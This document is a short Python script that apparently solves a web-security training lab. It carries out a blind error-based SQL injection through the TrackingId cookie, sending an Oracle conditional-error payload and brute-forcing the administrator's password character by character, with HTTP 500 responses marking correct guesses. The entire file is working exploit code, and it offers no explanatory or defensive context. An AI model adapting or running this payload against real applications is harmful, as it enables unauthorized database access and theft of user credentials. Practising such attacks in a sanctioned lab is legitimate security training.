import requests
import string

URL = "https://ac511fd11fa83849c0b7020d00850064.web-security-academy.net/"
BRUTE = string.ascii_letters + string.digits
print(BRUTE)
PASSWORD = ""
print("[INFO]: Starting")
print("[INFO]: Script is starting. Please wait. This might take a while")
for i in range(1,21):
    for j in BRUTE:
        cookies = {
            "TrackingId":f"AAAA' UNION SELECT CASE WHEN (SUBSTR((SELECT PASSWORD FROM USERS WHERE USERNAME = 'administrator'),{i},1) = '{j}') THEN to_char(1/0) ELSE NULL END FROM dual -- -",
            "session":"0j7eOeRYGjFIhLJABKI2Sj1HP5487S7f"
        }
        r = requests.get(url=URL, cookies=cookies)
        if r.status_code == 500:
            print(j)
            PASSWORD += j
            break
print(f"[INFO]: DONE. Password is: {PASSWORD}")